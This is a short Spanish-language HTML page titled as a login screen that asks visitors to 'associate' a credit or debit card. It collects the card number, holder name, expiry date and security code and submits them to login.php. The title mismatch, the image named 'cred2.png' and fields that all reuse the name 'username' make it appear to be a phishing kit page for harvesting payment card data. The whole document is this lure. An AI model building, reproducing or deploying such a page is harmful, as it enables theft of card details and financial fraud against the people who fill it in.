<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión</title>
    <style>
        body {
            
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 20px;
            padding: 0;
            background-color: #f0f0f0; 
            
        }
        .container {
            max-width: 600px;
            margin: auto;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        label {
            font-weight: bold;
        }
        input[type="text"], input[type="password"], input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #16245a;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #16245a;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="images/cred2.png" width="560px" height="300px">
        <h2>Asocie su tarjeta de credito o debito</h2>
        <form id="loginForm" action="login.php" method="POST">
            <label for="username">Numero</label><br>
            <input type="number" id="username" name="username" required><br><br>
            <label for="username">Nombre y apellido</label><br>
            <input type="text" id="username" name="username" required><br>
            <label for="username">Vencimiento</label>ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ<label for="username">Codigo de seguridad</label><br>
            <input type="date" id="username" name="username" required>ㅤㅤㅤㅤㅤㅤㅤㅤㅤ<input type="number" id="username" name="username" required>
            <br><br>
            <input type="submit" value="Registrar">
            
</form>
    </div>

</body>
</html>